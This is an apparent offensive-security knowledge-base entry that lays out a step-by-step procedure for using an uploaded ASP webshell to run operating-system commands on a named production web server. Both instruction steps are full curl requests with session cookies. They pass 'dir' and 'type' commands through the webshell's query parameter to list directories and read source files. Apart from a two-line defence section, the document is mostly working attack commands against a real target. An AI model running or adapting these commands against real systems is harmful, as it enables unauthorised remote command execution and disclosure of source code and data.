---
tags:
  - rce
  - webshell
type: procedure
tools:
  - '[[Burp Suite]]'
  - '[[curl]]'
tactics:
  - '[[TA0002]]'
commands:
  - '[[curl-execute-dir-command]]'
  - '[[curl-execute-type-command]]'
platforms:
  - Web
  - Windows
techniques:
  - '[[T1059]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: a63fe37c-1d5f-4f15-8a86-a59160a010ee
created_at: '2025-12-11T06:04:35.097Z'
updated_at: '2025-12-11T06:04:35.097Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Access Webshell and Execute OS Commands

## Summary

This procedure accesses the uploaded ASP webshell and executes arbitrary OS commands using GET requests with the ?getsc= parameter.

## Description

After upload, send requests to the webshell URL with encoded commands like 'dir' or 'type' to list directories or read files. This achieves RCE, disclosing sensitive information such as source code.

## Requirements

1. Path to uploaded ASP file
2. Valid session cookies
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Sanitize query parameters and restrict command execution
- Monitor for suspicious GET requests to temp files

## Objectives

1. Execute commands on the server
2. Disclose file listings and contents
3. Potential further compromise

## Instructions

### Step 1: Execute Directory Listing

**Context**: List files in a server directory.

**Command** ([[curl-execute-dir-command]]):
```bash
curl -i -s -k -X 'GET' -H 'Host: ecjobs.starbucks.com.cn' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: close' -H 'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 'Upgrade-Insecure-Requests: 1' -b '_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' 'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\TrustHX\STBKSERM101\www_app%20/d/s/b'
```

> Response contains directory listing in a textarea.

### Step 2: Execute File Read

**Context**: Read contents of a source code file.

**Command** ([[curl-execute-type-command]]):
```bash
curl -i -s -k -X 'GET' -H 'Host: ecjobs.starbucks.com.cn' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: close' -H 'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H 'Upgrade-Insecure-Requests: 1' -b '_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' 'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\TrustHX\STBKSERM101\www_app\concurrent_test\new_application_concurrent_test__svc.cs'
```

> Response contains file contents in a textarea.

## MITRE ATT&CK Mapping

### Tactics

- [[TA0002]]

### Techniques

- [[T1059]]

### Sub-Techniques



## Commands Used

- [[curl-execute-dir-command]]
- [[curl-execute-type-command]]

## Tools Used

- [[curl]]

## Tags

- [[rce]]
- [[webshell]]
